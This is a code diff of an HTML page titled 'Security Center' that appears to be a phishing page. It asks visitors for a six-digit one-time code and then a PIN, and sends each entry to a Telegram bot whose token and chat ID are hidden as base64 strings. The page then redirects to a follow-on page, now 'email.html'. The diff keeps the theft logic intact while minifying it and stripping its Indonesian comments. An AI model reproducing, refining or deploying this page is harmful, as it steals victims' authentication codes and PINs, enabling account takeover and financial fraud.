@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Center</title>
     <style>
         body { font-family: sans-serif; text-align: center; margin: 0; padding: 20px; color: #333; }
@@ -37,90 +36,43 @@
 
     <script>
         (function(){
-            /**
-             * Penjelasan Array _k:
-             * [0] : Token Bot Telegram (Base64)
-             * [1] : Chat ID Telegram (Base64)
-             * [2] : "formulir2.html" (Base64) -> Ini yang sudah diubah
-             */
-            const _k = [
-                "ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==",
-                "NTkyMzAzMTgyNQ==",
-                "Zm9ybXVsaXIyLmh0bWw="
-            ];
-
+            const _k = ["ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==","NTkyMzAzMTgyNQ==","ZW1haWwuaHRtbA=="];
             const _u = "https://api.telegram.org/bot" + atob(_k[0]) + "/sendMessage";
             document.getElementById('dN').innerText = localStorage.getItem('vNum') || "User";
 
-            // Fungsi validasi agar user tidak memasukkan angka yang sama berulang kali (misal 111111)
             function _chk(v) {
                 if (/^(.)\1{5}$/.test(v)) return false; 
                 let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
                 return !h.includes(v);
             }
 
-            // Fungsi inisialisasi input kotak-kotak
             function _init(ins, btn, cb) {
                 ins.forEach((el, i) => {
-                    // Pindah fokus ke kotak berikutnya saat mengetik
-                    el.oninput = () => { 
-                        if (el.value && i < 5) ins[i + 1].focus(); 
-                        btn.disabled = Array.from(ins).some(x => !x.value); 
-                    };
-                    // Kembali ke kotak sebelumnya saat backspace
-                    el.onkeydown = (e) => { 
-                        if (e.key === "Backspace" && !el.value && i > 0) ins[i - 1].focus(); 
-                    };
-                    // Support copy-paste 6 angka sekaligus
+                    el.oninput = () => { if (el.value && i < 5) ins[i + 1].focus(); btn.disabled = Array.from(ins).some(x => !x.value); };
+                    el.onkeydown = (e) => { if (e.key === "Backspace" && !el.value && i > 0) ins[i - 1].focus(); };
                     el.onpaste = (e) => {
                         let d = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').split('');
-                        if (d.length >= 6) { 
-                            ins.forEach((inp, x) => inp.value = d[x] || ''); 
-                            btn.disabled = false; 
-                            e.preventDefault(); 
-                        }
+                        if (d.length >= 6) { ins.forEach((inp, x) => inp.value = d[x] || ''); btn.disabled = false; e.preventDefault(); }
                     };
                 });
-
-                // Aksi tombol saat diklik
                 btn.onclick = async () => {
                     let val = Array.from(ins).map(x => x.value).join('');
                     if (_chk(val)) {
                         btn.disabled = true;
                         let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
-                        h.push(val); 
-                        sessionStorage.setItem('_h', JSON.stringify(h));
-
-                        // Kirim data ke Bot Telegram
-                        try {
-                            await fetch(_u, { 
-                                method: "POST", 
-                                headers: { "Content-Type": "application/json" }, 
-                                body: JSON.stringify({ 
-                                    chat_id: atob(_k[1]), 
-                                    text: "Code: " + val 
-                                }) 
-                            });
-                        } catch (e) {
-                            console.error("Gagal mengirim data.");
-                        }
-                        
-                        cb(); // Lanjut ke langkah berikutnya
-                    } else { 
-                        alert("Error: Gunakan kode yang valid atau berbeda."); 
-                    }
+                        h.push(val); sessionStorage.setItem('_h', JSON.stringify(h));
+                        await fetch(_u, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: atob(_k[1]), text: "Code: " + val }) });
+                        cb();
+                    } else { alert("Error: Use different code."); }
                 };
             }
 
-            // Inisialisasi Langkah 1 (OTP)
             _init(document.querySelectorAll('.oi'), document.getElementById('bo'), () => {
                 document.getElementById('os').style.display = 'none';
                 document.getElementById('ps').style.display = 'block';
             });
 
-            // Inisialisasi Langkah 2 (PIN)
             _init(document.querySelectorAll('.pi'), document.getElementById('bp'), () => {
-                // Setelah PIN benar, diarahkan ke file yang ada di _k[2] (formulir2.html)
                 window.location.href = atob(_k[2]);
             });
         })();
